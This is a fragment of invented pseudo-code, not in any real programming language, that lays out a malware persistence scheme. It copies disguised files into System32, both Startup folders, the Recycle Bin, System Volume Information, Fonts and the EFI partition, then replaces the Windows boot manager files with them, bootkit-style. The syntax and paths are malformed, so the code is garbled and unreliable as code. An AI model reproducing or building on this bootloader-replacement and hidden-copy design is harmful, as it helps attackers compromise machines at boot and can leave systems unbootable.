s_

[4.3] | {
    func.duplicate {  
    copy(lister\x\glycerine9009842.act.winsys.ms) des_dir(C:\\Windows\\System32\\);
    copy(lister\x\glycerine299874.act.winsys.ms) des_dir(C:\\Windows\\Temp\\);
    copy(lister\x\glycerine2884.act.winsys.ms) des_dir(C:\\Users\\%UserProfile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\); {
          copy(lister\x\glycerine66634567.act.winsys.ms) des_dir(C:\\Users\\%UserProfile%\\AppData\\Local\\Temp\\);
          copy(lister\x\glycerine662346.act.winsys.ms) des_dir(C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\);
          copy(lister\x\glycerine53892347.act.winsys.ms) des_dir(C:\\$Recycle.Bin\\);
    } {
                   copy(lister\x\glycerine4093804208.act.winsys.ms) des_dir(C:\\System Volume Information\\);
                   copy(lister\x\glycerine3342.act.winsys.ms) des_dir(C:\\Windows\\Fonts\\);
                   copy(lister\x\glycerine2236344677337889.act.winsys.ms) des_dir(C:\\Program Files\\Common Files\\Microsoft Shared\\);
                   copy(lister\x\glycerine1200897348.act.winsys.ms) des_dir(C:\\Users\\%UserProfile%\\AppData\\Local\\Microsoft\\Windows\\Explorer\\);       
    } {
                            copy(lister\x\glycerine9009842.act.winsys.ms) des_dir(C:\\EFI\\Microsoft\\Boot\\glycerine9009842.act.winsys.msc);
                            copy(lister\x\glycerine299874.act.winsys.ms) des_dir(C:\\EFI\\Boot\\glycerine299874.act.winsys.msc);
                            copy(lister\x\glycerine2884.act.winsys.ms) des_dir(C:\\EFI\\Boot\\glycerine2884.act.winsys.msc);
    }
    }
}

[4.3] | {
    uefi.modify_bootloader("C:\\EFI\\Microsoft\\Boot\\glycerine9009842.act.winsys.msc");
    uefi.modify_bootloader("C:\\EFI\\Boot\\glycerine299874.act.winsys.msc"); {
          uefi.replace_bootloader("C:\\EFI\\Microsoft\\Boot\\bootmgfw.efi", "C:\\EFI\\Microsoft\\Boot\\glycerine9009842.act.winsys.msc");
          uefi.replace_bootloader("C:\\EFI\\Boot\\bootx64.efi", "C:\\EFI\\Boot\\glycerine299874.act.winsys.msc");
    }
}
